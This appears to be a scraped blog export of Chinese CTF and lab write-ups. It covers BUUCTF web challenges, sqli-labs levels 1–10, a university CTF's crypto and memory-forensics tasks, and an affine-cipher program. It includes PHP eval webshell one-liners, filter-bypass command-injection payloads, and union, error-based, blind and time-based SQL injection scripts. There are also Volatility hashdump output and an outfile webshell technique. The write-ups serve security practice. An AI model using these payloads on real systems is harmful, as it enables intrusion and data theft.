&quot;&lt;br&gt;&quot;;$c=&#x27;(eval($_POST[&quot;test&quot;]))&#x27;;$d=urlencode(~$c);echo $d; ?&gt; 1?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6); 使用蚁剑连接后发现了flag文件和readflag 但是flag文件不可以直接读取(因为命令执行函数被禁用)，需要使用readflag读取其中的内容 可以使用蚁剑自带的插件绕过disable_function，之后运行readflag获取flag文件内容 但是再蚁剑安装插件时，插件一直加载不出来需要挂代理之后才能加载出来 其中端口是你所使用的梯子向外转发的端口 安装 绕过disable_function 这个插件 插件安装好后就是无脑操作了。 [FBCTF2019]RCEService要求输入json格式的命令 最简单的形式，可以用下面这样的 JSON 表示 “名称 / 值对” ：{ “firstName”: “Brett” } 输入 1&#123;&quot;cmd&quot;:&quot;ls&quot;&#125; 会显示出index.php，没有其他的文件了 尝试读取该文件，但是出现了hacking，说明存在waf，cat命令被过滤 尝试了less，more，发现都被过滤 网上找到了源码 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 可以看到正则表达式打开头和结尾存在^,$，说明是单行匹配，可以利用换行符绕过过滤 代码的第一句putenv(&#39;PATH=/home/rceservice/jail&#39;);，程序改变了环境变量，只能用绝对路径执行命令，而我们使用的命令都存在/bin中 多行绕过解题payload： 123&#123;%0A&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0A&#125;&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125; 利用PCRE回溯来绕过 preg_match什么是PCRE 点这里 脚本如下 123456import requestspayload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;nayi&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27; ##超过一百万，这里写一千万不会出结果。res = requests.post(&quot;http://2526ca08-39b8-48c4-8385-e8c5d4b5dfd7.node3.buuoj.cn/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)#需要使用POST方式，因为get不能提交这么大的数据print(res.text) [BSidesCF 2019]Kookie进入页面提示了设置cookie 构造cookie 1Cookie: monster=admin 重放后在相应包中看到第二个提示，设置username= 再次构造cookie 1Cookie: monster=admin;username=admin [CISCN2019 总决赛 Day2 Web1]Easyweb一般这种摸不着头脑的题目都会扫描目录，发现了robots.txt 提示存在 .php.bak，文件，结合源码中的image.php，很容易找到image.php.bak 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 0x1 sql注入很明显是存在sql注入的，但是这里对输入的id参数进行了过滤，过滤了 \\0,&#39;,\\&#39;等 但是由于存在转义函数addslashes以及\\0 &#39;等也被过滤 构造payload 1http://d25c0ff4-f5be-4d29-9985-a6474788f806.node3.buuoj.cn/image.php?id=\\0&#x27;&amp;path= or 1=1%23 sql查询语句为 1select * from images where id=&#x27;\\&#x27; or path=&#x27; or 1=1# 从数据库中获取密码 首先测试密码长度 1http://d25c0ff4-f5be-4d29-9985-a6474788f806.node3.buuoj.cn/image.php?id=\\0%27&amp;path=%20or%20length((select group_concat(password) from users))=20%23 当长度为20时，页面显示图片，说明长度为20 编写脚本获取密码 1234567891011121314151617181920import requestsurl = &quot;http://d25c0ff4-f5be-4d29-9985-a6474788f806.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;payload = &quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;result = &quot;&quot;for i in range(1,100): l = 1 r = 130 mid = (l + r)&gt;&gt;1 while(l&lt;r): payloads = payload.format(i,mid) print(url+payloads) html = requests.get(url+payloads) if &quot;JFIF&quot; in html.text: l = mid +1 else: r = mid mid = (l + r)&gt;&gt;1 result+=chr(mid) print(result) 获取的账号密码 12username: admin password: 2bab3f14b41e46436896 登录后可以发现是文件上传的页面 0x2 文件上传上传php文件发现不行，就随随便上传一个txt文件，可以发现会将文件名写入日志文件，而这个日志文件又是php类型的文件，所以只需要将文件名改为一句话木马即可将日志文件当作我们可以利用的木马文件 直接将文件名改为一句话木马发现存在过滤，使用短标签 1filename=&quot;&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;&quot; 之后蚁剑连接 1http://2ff2b0ba-2e9e-4671-ab7c-a547f3b6e80b.node3.buuoj.cn/logs/upload.5874e8eeee7baaa825eed3a08e0976bf.log.php [GKCTF2020]EZ三剑客-EzWeb查看源码发现提示 ?secret 123456789101112131415161718192021222324eth0 Link encap:Ethernet HWaddr 02:42:0a:c0:22:09 inet addr:10.192.34.9 Bcast:10.192.34.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:22 errors:0 dropped:0 overruns:0 frame:0 TX packets:18 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:5792 (5.7 KB) TX bytes:4648 (4.6 KB)eth1 Link encap:Ethernet HWaddr 52:54:00:92:05:19 inet addr:10.128.0.67 Bcast:10.128.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:18 errors:0 dropped:0 overruns:0 frame:0 TX packets:21 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:6670 (6.6 KB) TX bytes:2044 (2.0 KB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:23 errors:0 dropped:0 overruns:0 frame:0 TX packets:23 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:2371 (2.3 KB) TX bytes:2371 (2.3 KB) 可以知道服务器的地址为10.128.0.67 使用file协议读取源码 1file:/var/www/html/index.php 1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;别这样&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; 过滤了file://,dict, .. , 127.0.0.1, localhost，但是还有http，gopher协议可以用，用http协议可进行内网主机存活检测，使用bp爆破","tags":[]},{"title":"sql_labs","date":"2021-01-30T13:13:02.000Z","path":"2021/01/30/sql-labs/","text":"寒假在家没事做，给自己找点事做，想来想去还是做一些漏洞实验吧 搭建好环境后就可以开始做题了 level1get提交参数id 首先提交1&#39;，判断是字符型还是数字型注入 这里出现报错，说明是字符类型的，并且是用&#39;将参数id包裹起来的。 接下来就是判断列数，爆表名，爆列名和数据库内容 0x1 确定列数并爆出表名 当列数增加到4的时候开始报错，说明是三列 1?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 0x2 爆列名1?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ 这里的列名很多 1user_id,first_name,last_name,user,password,avatar,last_login,failed_login 0x3 爆出内容选择password 1?id=-1&#x27; union select 1,group_concat(password),3 from users--+ level2同样使用 id=1&#39;，判断是什么类型的注入 可以发现输入的&#39;没有其他的&#39;与之闭合，导致报错，所以这是数字型注入 所以可以直接使用level1的注入语句，只需要删除 ‘ 即可 12345?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1 union select 1,group_concat(password),3 from users--+ level3提交id=1&#39; 分析一下报错原因 出错的语句为 1&#x27;1&#x27;&#x27;) LIMIT 0,1 其中1’输入的内容，所以包裹参数的格式为(&#39;id&#39;) 注入语句可以直接在level1的基础上增加一个 )即可 将原语句修改为 1&#x27;1&#x27;) 注入语句 --+ &#x27;) LIMIT 0,1 12345?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1&#x27;) union select 1,group_concat(password),3 from users--+ level4同样输入id=1&#39;，但是这次没有报错，才是是使用了&quot;，换成id=1&quot; 很明显和level3基本相同，将&#39;改为&quot;，就是这关的答案 level5这题是字符型注入，但是不在回显所查询的内容，所以是盲注 查看源码也可以发现 不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入 报错注入 (1). 通过floor报错 and (select 1 from (select count(),concat((payload) from users limit 0,1),floor (rand(0)2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 (2). 通过updatexml报错 and updatexml(1,payload,1) 同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。 0x1 确定数据库名1?id=1&#x27; and extractvalue(1,concat(0x23,database(),0x23))--+ 0x2 爆表名1?id=1&#x27; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x23))--+ 这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名 0x3 爆列名1?id=1&#x27; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),0x23))--+ 0x4 爆内容1?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+ 后面的内容可以通过改变limit后的第一个参数查看 level6与level5很像 但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可 level7提交id=1，出现提示 需要使用outfile函数 在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个 into dumpfile() into outfile() load_file() 这里我们利用outfile函数 首先确定这关包裹参数的格式 一直测试到id=1&#39;)) --+，才显示正确所以可以确定参数的包裹格式为((&#39;id&#39;)) 0x1 向网站根目录写入一句话木马 执行后就可以在根目录中看到这个文件 0x2 使用蚁剑连接12127.0.0.1/3.php密码:cmd level8根据标题和测试结果可以看出是盲注 首先判断是什么类型注入 提交id=1，显示结果为You are in，可以确定成功查询返回的结果 提交id=1&#39;，没有提示You are in，但是提交id=1&#39; --+，再次出现You are in，可以确定是字符型注入，包裹形式为&#39;id&#39; 接下来就是确定盲注使用的语句，这里可以使用 ascii和substring两个函数 0x1 爆出数据库名1?id=1&#x27; and ascii(substring(database(),1,1))&gt;97%23 首先假设数据库名的第一个字母的ascii码值大于97，回显为you are in，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。 可以使用脚本完成该过程，脚本跑出的结果为 security 0x2 爆出表名使用注入语句 1id=1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23 最后爆出的表名如下 0x3 爆出列名1id=1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23 0x4 爆出内容1id=1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23 完整脚本如下 123456789101112131415161718192021222324252627import requestsurl = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;flag = &quot;&quot;t = &quot;&quot;sum=0for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;You are in&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag)print(flag) level9题目标题提示了是基于时间且单引号闭合的盲注 基于时间的盲注需要使用到sleep函数，基本用法如下 分别提交id=1，id=1&#39; and sleep(3) --+，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。 注入脚本只需要改一改level8的即可。 完整脚本如下 123456789101112131415161718192021222324252627import requestsimport datetimeurl = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;flag = &quot;&quot;for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag)print(flag) 爆破数据库名的过程如下 level10与level9基本相同，只需要将payload中的&#39;换成&quot;即可 完整脚本如下 123456789101112131415161718192021222324252627import requestsimport datetimeurl = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;flag = &quot;&quot;for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&quot; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag)print(flag)","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"cumtfinal","date":"2021-01-11T14:04:30.000Z","path":"2021/01/11/cumtfinal/","text":"web每做出来，还是太菜了，还是要多做题 Webez_jsF12在source中看到main.js，将其中的内容复制在控制台中运行，运行完后控制台会关闭，再次打开控制台，会看到一个 打开之后看到还是js代码，但是可以看到 在其中找到flag的其他部分，拼接起来即可 CryptoRSA签到没啥难的，就是找到解密的网站即可 几个网站如下 http://www.atoolbox.net/Tool.php?Id=937 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo 1234567891011121314# n: 807862607863494903203347547751222668477246136996519972166847# c: 6525071913169990474785757170304035615411828876052879070297# e: 65537from Crypto.Util.number import *from gmpy2 import *n=807862607863494903203347547751222668477246136996519972166847p=780900790334269659443297956843q=1034526559407993507734818408829e=65537c=6525071913169990474785757170304035615411828876052879070297d=inverse(e,(p-1)*(q-1))m=pow(c,d,p*q)print(long2str(m)) 简单的密码学离散对数攻击 脚本如下 123456789m = 45930439493588458217814199095166325056793804285450102007731089001050571514856332627851425138364361016243889773238664380678029627984235001868004334568770697c = 5057805883715955343508948629802682033540608675113624374337084633322875196538392521768197949724904990019045804655058020268973563802830621371118940310488041n = 2 ** 514import sympyimport binasciiflag=sympy.discrete_log(2**514,c,m)print(binascii.unhexlify(hex(flag)[2:])) 名字不重要懂得都懂，是原题 1https://www.anquanke.com/post/id/200545 名字没想好第一部分 1234567891011121314151617181920gift= 12255978148467209895405401462014060633654138661175100957121874362221982957915022396069673248235108357771688051303453363643967834593066030782680214462115370497967778055593927850150182758869847946921291057362002616022538712593775400754634332361618945061055025544419655001567836482206750906414655010614360056137481173664901476116870144816992211793902146834987166288769615612767704010592138813256140678199511291489394523989294805910740127557682458229594376211232977501267410539674224065875285801753027816046254818608535462445306054117075379711073762930279723764342988824053970592468109679774789092077979655857748513636834import gmpy2e=103738c=7357116532209949285136310518084676100522798730487701269950303460540634127932201594120600757671807456790592531487713433579926404640474277692592102315472760853853767347752080563508622523821339163225554653816787201616233932746815764392729597579461985789538131853246938443458331139199802764554726447278501492140335824365867574318693890007499638038064582031311613039571335453968072426153706431456149868515230310567240569544961967582304893471240728585336273245259533905230737876248875784828430507371662455796543123714325161987112223947057481814610592300979207673818538093532100233028106442070524965861451563388404227738574n=24511956296934419790810802924028121267308277322350201914243748724443965915830044792139346496470216715543376102606906727287935669186132061565360428924230740995935556111187855700300365517739695893842582114724005232045077425187550801509268664723237890122110051088839310003135672964413501812829310021228720112275276180469100308793523051405119335989674132224715582989624204590983857159312466387546505666052162775188773736419909262619409755848412558718676873188073997893894862353873441073313610102773845304906678909624700529896455885309546409645526387707907518497436045821973310653257012148438207441605902771515486273283273for i in range(100): phi=gift*i pq=n+1-phi p_q=gmpy2.iroot(pq**2-4*n,2)[0] if gmpy2.is_prime((pq+p_q)//2): p=(pq+p_q)//2 q=pq-p breaknew_e=e//2new_d=gmpy2.invert(new_e,(p-1)*(q-1))m_2=gmpy2.powmod(c,new_d,n)m=gmpy2.iroot(m_2,2)[0]import binasciiprint(binascii.unhexlify(hex(m)[2:]))# CUMTCTF&#123;now_you_get 第二部分 很明显给的p和q是相邻的素数 解题思路：1.题目给了 e,d,c三个值，所以由公式 ed=1 mod (q-1)(p-1) 得到 (ed-1)=k \\ (q-1)(p-1) (设k为整数)2.分析题目可知p,q接近，p*q为2048位，**所以(p-1)\\(q-1)&lt;=2048计算可知 *e\\d-1 是 2063 位的，所以K的取值范围为（pow(2,14),pow(2,15)） 3.通过爆破K的值，可以得到(p-1)*(q-1) 的值，对phi 开平方，进而求得p,q。这里涉及的算法我通过举例来论证。 脚本如下 123456789101112131415161718192021222324from gmpy2 import *from sympy import *#from libnum import *from Crypto.Util.number import *e = 0x10001d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804d = 14519297697723031496224953772301033569165883208616356699837703756220717249229195213146695656923357394378868735444167631602696573904678412172248043414276910206086892084385988564720914312238316434518024995169814463252129242492227202678878240875905293369168263909256455159691392124769949072754243536472227070447391890140409479709945084894060833468804156778720190688101601664725009609222256314873780002770605127043596912060811904733471592387441742111474341938658516761896926403628885365926903655309306738689809023277824030268579979837642613499180913999651379232105756338399243024739524553588216117189742912479604441636257c = 23574157314515030841894399693996910252287747536395985840285410194536546768646580704111053676040921830550019965767796038280932469005359270920519250763405535872475345625907947986452218739530197421244240070129909526493952916306821311836861766221812155261751444946282559677005557815746813525162411907545113665605490915464367483833005576787591204417525937745572210195816236947103271664048065491627347939268785403334419989160034526164012966888952162714736497312282011026789187871221751240709801544484784941178786820290118585681595783245449236394480319395321877182096839866054466492123200354772280398476167002177544154960579for k in range(pow(2, 14), pow(2, 15)): if (e * d - 1) % k == 0: phi = (e * d - 1) // k P1 = iroot(phi, 2)[0] # 对(q-1)*(p-1)开平方 p = nextprime(P1) # 获取素数P q_1 = phi // (p - 1) # 得到(q-1) q = q_1 + 1 if (isprime(q)): # 对q进行素性检测 breakn = p * qm = pow(c, d, n)m = long_to_bytes(m).decode()# _the_full_flag!@#$%!!!&#125; Misc签到文本.txt-&gt;base64-&gt;佛曰-&gt;维吉尼亚密码 123455L2b5puw77ya5ZOG576v5Yal6IiN5oCv6Iul6JiH5Y2z5oCv5a+G5qCX5L6E6YKj5oCv5aSa55qk5pWF5L6E562J5a+m5ZCJ5Zad5LiK5rOi5oCb57y96Ky55Yal5aSi5q6/5ZG85L+x5a+G6YO95puw6YKj5a+G5oGQ57y95puz5L+x6Iul5L6E5a+G5a+G6JeQ6Iez5Yal56SZ5ZOG5pyJ56mG5qeD5qWe55qk5qCX55qk5a+G5oGQ5Lul572w44CC5oCv6Ku46YGu6Iez5L6E5pm65ZGQ5q27佛曰：哆羯冥舍怯若蘇即怯密栗侄那怯多皤故侄等實吉喝上波怛缽謹冥夢殿呼俱密都曰那密恐缽曳俱若侄密密藐至冥礙哆有穆槃楞皤栗皤密恐以罰。怯諸遮至侄智呐死RFMRHNS&#123;Tlsw_Xctc_Tn!!&#125; 文本2.txt-&gt;base64-&gt;音符解密 之后维吉尼亚解密 内存取证用到的命令如下 1234567891011volatility -f WIN-6G0M6M15T07-20201222-120531.raw imageinfovolatility -f WIN-6G0M6M15T07-20201222-120531.raw --profile=Win7SP1x64 pslistvolatility -f WIN-6G0M6M15T07-20201222-120531.raw --profile=Win7SP1x64 filescan | grep -E &#x27;txt|png|jpg|gif|zip|rar|7z|pdf|doc&#x27;volatility -f WIN-6G0M6M15T07-20201222-120531.raw --profile=Win7SP1x64 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;volatility -f WIN-6G0M6M15T07-20201222-120531.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000b7d010volatility -f WIN-6G0M6M15T07-20201222-120531.raw --profile=Win7SP1x64 hivelist file.txt中的内容如下 123456ZmxhZ+WJjeWNiuauteS4um1kNSjnlKjmiLflkI065a+G56CBKe+8iGN1bXTnlKjmiLfvvIkK5ZCO5Y2K5q615Li65LqM57u056CB5a2X56ymbWQ1CuS4pOerr21kNei/m+ihjHNoYTHljbPkuLpmbGFn44CCflag前半段为md5(用户名:密码)（cumt用户）后半段为二维码字符md5两端md5进行sha1即为flag。 12345Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::::1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::cumt:1002:aad3b435b51404eeaad3b435b51404ee:771bae3633234ef91354c68c6d7dded3:::ctf:1003:aad3b435b51404eeaad3b435b51404ee:700ec8a682f6e41418007992fc604c77::: cumt的秘密md5解密后为 everyone 扫描二位码内容为lovecumt flag是 12CUMTCTF&#123;sha1(md5(cumt:everyone)+md5(lovecumt))&#125;CUMTCTF&#123;474e781ec985094b88fde2f6ecb975b82f90e4a9&#125; ​","tags":[]},{"title":"密码学","date":"2020-12-23T08:37:43.000Z","path":"2020/12/23/密码学/","text":"密码学实验课程设计 一、古典密码仿射密码简介仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换 加密原理假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文 加密函数：Y=（AX+B）%26 解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26 原理很简单，代码实现也比较简单 代码实现各个函数作用 1234gcd(a,b) 求a,b的最大公因子findModReverse(a,m) 计算a模m的逆元encode(a,b,s) 仿射加密decode(a,b,s) 仿射解密 利用扩展的欧几里得算法求逆元 1234567891011121314def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return bdef findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m 完整代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return bdef findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%mdef encode(a,b,s): result = &quot;&quot; # 保存加密结果 s = s.upper() # 全部转换为大写，方便计算 for i in range(0,len(s)): s2 = chr((a*(ord(s[i])-65)+b)%26 + 65) #使用加密公式 Y=（AX+B）%26 result = result +s2 print(result.lower())def decode(a,b,s): a1 = findModReverse(a,26) result = &quot;&quot; s = s.upper() for i in range(0, len(s)): s2 = chr((a1 * (ord(s[i]) - 65 - b)) % 26 + 65) # 使用解密公式X=（A的逆元）*（Y-B）%26 result = result + s2 print(result.lower())def s_decode(a,b,s): letter =&#x27;abcdefghijklmnopqrstuvwxyz&#x27; letter = letter.upper() s = s.upper() result = &quot;&quot; for i in s: for j in range(0,len(letter)): if i == letter[(a*j+b)%26]: result = result+letter[j] print(result.lower())def main(): # 主函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要加密的字符:&#x27;) encode(a, b, s) elif answer.upper() == &#x27;D&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要解密的字符：&#x27;) decode(a, b, s) # 利用逆元解密 # s_decode(a,b,s) # 暴力枚举每一个字符 else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请勿输入空格！&#x27;)if __name__ == &#x27;__main__&#x27;: main()# a = 7, b = 22# plain = firstthesentenceandthentheevidencesaidthequeen# crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj 